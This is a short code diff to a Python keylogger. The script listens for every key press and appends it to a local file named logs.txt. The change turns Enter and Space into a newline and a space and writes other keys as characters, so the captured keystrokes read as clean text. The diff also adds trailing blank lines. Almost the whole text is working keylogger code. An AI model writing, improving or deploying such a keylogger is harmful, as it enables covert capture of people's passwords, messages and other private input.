@@ -4,7 +4,12 @@ def keylog(key):
     print(str(key))
     with open('logs.txt', 'a') as logs:
         try:
-            logs.write(str(key)+"\n")
+            if key == keyboard.Key.enter:
+                logs.write("\n")
+            elif key == keyboard.Key.space:
+                logs.write(" ")
+            else:
+                logs.write(key.char)
         except:
             print("skipi 3bdsami3")
 
@@ -13,3 +18,17 @@ if __name__ == "__main__":
     listener = keyboard.Listener(on_press=keylog)
     listener.start()
     input()
+
+    
+    
+    
+
+
+
+    
+    
+    
+    
+    
+
+
